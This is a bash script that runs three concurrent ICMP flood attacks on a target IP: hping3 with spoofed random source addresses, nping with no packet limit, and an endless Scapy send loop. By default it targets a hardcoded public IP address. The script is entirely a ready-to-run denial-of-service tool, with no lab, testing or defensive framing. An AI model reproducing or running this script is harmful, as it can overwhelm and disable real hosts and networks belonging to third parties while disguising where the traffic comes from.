#!/bin/bash

# Set default target IP address
DEFAULT_TARGET="51.91.236.255"

# Function to perform ICMP flood using hping3
run_hping3() {
    echo "Starting hping3 flood attack on target: $TARGET"
    sudo hping3 -1 --flood --rand-source $TARGET &
}

# Function to perform ICMP flood using nping
run_nping() {
    echo "Starting nping flood attack on target: $TARGET"
    sudo nping --icmp --count 0 --delay 1ms $TARGET &
}

# Function to perform ICMP flood using Scapy
run_scapy() {
    echo "Starting Scapy flood attack on target: $TARGET"
    sudo python3 -c "
from scapy.all import *
import time

def send_icmp_flood(target_ip):
    while True:
        packet = IP(dst=target_ip) / ICMP() / 'CustomPayload'
        send(packet, verbose=0)
        time.sleep(0.001)

target_ip = '$TARGET'
send_icmp_flood(target_ip)
" &
}

# Function to display script usage information
show_usage() {
    echo "Usage: $0 [target_ip]"
    echo "target_ip   Target IP address to perform flood attacks (default: $DEFAULT_TARGET)"
    exit 1
}

# Parse command-line arguments
if [ $# -eq 0 ]; then
    TARGET=$DEFAULT_TARGET
elif [ $# -eq 1 ]; then
    TARGET=$1
else
    show_usage
fi

# Main function to run all flood attacks
main() {
    run_hping3
    run_nping
    run_scapy

    # Wait for all background processes to finish
    wait
}

# Handle script execution
main
